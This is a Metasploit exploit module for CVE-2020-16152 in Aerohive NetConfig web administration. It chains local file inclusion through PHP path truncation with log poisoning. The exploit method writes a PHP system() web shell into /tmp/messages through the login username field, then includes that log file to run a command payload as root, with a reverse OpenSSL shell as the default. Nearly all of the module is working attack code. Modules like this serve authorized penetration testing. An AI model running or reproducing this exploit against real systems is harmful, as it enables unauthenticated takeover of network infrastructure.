##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Aerohive NetConfig 10.0r8a LFI and log poisoning to RCE',
        'Description' => %q{
          This module exploits LFI and log poisoning vulnerabilities
          (CVE-2020-16152) in Aerohive NetConfig, version 10.0r8a
          build-242466 and older in order to achieve unauthenticated remote
          code execution as the root user. NetConfig is the Aerohive/Extreme
          Networks HiveOS administrative webinterface. Vulnerable versions
          allow for LFI because they rely on a version of PHP 5 that is
          vulnerable to string truncation attacks. This module leverages this
          issue in conjunction with log poisoning to gain RCE as root.

          This module has been successfully tested against Aerohive NetConfig
          version 10.0r7a.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Erik de Jong', # github.com/eriknl - discovery
          'Erik Wynter' # @wyntererik - Metasploit'
        ],
        'References' => [
          ['CVE', '2020-16152'], # still categorized as RESERVED
          ['URL', 'https://github.com/eriknl/CVE-2020-16152'] # analysis and PoC code
        ],
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443,
          'PAYLOAD' => 'cmd/unix/reverse_openssl' # this may be the only payload that works
        },
        'Platform' => %w[unix],
        'Arch' => ARCH_CMD,
        'Privileged' => true,
        'DisclosureDate' => '2020-02-17',
        'Targets' => [ ['CMD', {}], ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )

    register_options [
      OptString.new('TARGETURI', [true, 'The base path to Aerohive NetConfig', '/']),
    ]
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php5')
    })

    unless res
      return CheckCode::Unknown('Connection failed.')
    end

    unless res.code == 200 && res.body.include?('Aerohive NetConfig UI')
      return CheckCode::Safe('Target is not an Aerohive NetConfig application.')
    end

    version = res.body.scan(/action="login\.php5\?version=(.*?)"/)&.flatten&.first
    unless version
      return CheckCode::Detected('Could not determine Aerohive NetConfig version.')
    end

    begin
      if Rex::Version.new(version) <= Rex::Version.new('10.0r8a')
        return CheckCode::Appears("The target is Aerohive NetConfig version #{version}")
      else
        print_warning('It should be noted that it is unclear if/when this issue was patched, so versions after 10.0r8a may still be vulnerable.')
        return CheckCode::Safe("The target is Aerohive NetConfig version #{version}")
      end
    rescue StandardError => e
      return CheckCode::Unknown("Failed to obtain a valid Aerohive NetConfig version: #{e}")
    end
  end

  def poison_log
    password = rand_text_alphanumeric(8..12)
    @shell_cmd_name = rand_text_alphanumeric(3..6)
    @poison_cmd = "<?php system($_POST['#{@shell_cmd_name}']);?>"

    # Poison /tmp/messages
    print_status('Attempting to poison the log at /tmp/messages...')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login.php5'),
      'vars_post' => {
        'login_auth' => 0,
        'miniHiveUI' => 1,
        'authselect' => 'Name/Password',
        'userName' => @poison_cmd,
        'password' => password
      }
    })

    unless res
      fail_with(Failure::Disconnected, 'Connection failed while trying to poison the log at /tmp/messages')
    end

    unless res.code == 200 && res.body.include?('cmn/redirectLogin.php5?ERROR_TYPE=MQ==')
      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to poison the log at /tmp/messages')
    end

    print_status('Server responded as expected. Continuing...')
  end

  def exploit
    poison_log
    print_status('Attempting to execute the payload')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'action.php5'),
      'vars_get' => {
        '_action' => 'list',
        'debug' => 'true'
      },
      'vars_post' => {
        '_page' => 'a' + '/..' * 8 + '/' * 4041 + '/tmp/messages',  # Trigger LFI through path truncation
        @shell_cmd_name => payload.encoded
      }
    })

    unless res
      fail_with(Failure::Disconnected, 'Connection failed while trying to execute the payload')
    end

    unless res.code == 200 && res.body.include?('/tmp/messages')
      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to execute the payload')
    end

    print_warning('In case of successful exploitation, this module requires manual cleanup of the log file at /tmp/messages')
    print_warning("Deleting this file may break the application, so it's advised to manually remove the line containing the poison command:\n\t#{@poison_cmd}")
  end
end
